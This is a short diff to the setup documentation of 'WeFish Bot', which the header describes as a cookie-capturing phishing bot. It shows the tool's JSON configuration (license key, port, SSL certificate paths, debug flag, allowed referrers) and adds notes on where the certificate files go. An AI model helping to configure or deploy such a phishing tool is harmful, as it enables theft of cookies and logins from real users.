@@ -53,8 +53,8 @@ Beyond capturing cookies phishing bot.
   <pre>
 "key": "10000100001111", /WeFish Bot license key.
 "port": 80,
-"ssl_cert": "crt.pem", //ssl cert file from win-acme.
-"ssl_key": "key.pem", //ssl key file.
+"ssl_cert": "crt.pem", //ssl cert file from win-acme, must be present in ssl foldler in wefish folder.
+"ssl_key": "key.pem", //ssl key file, must be present in ssl foldler in wefish folder
    
    "debugMode": true, //set to false when going live.
    "allowedRefera": [ "No referrer"], //allow which domain WeFish should accept request from. can be single or multiple, ["http:///domain1.com", "https://domain2.org" ].
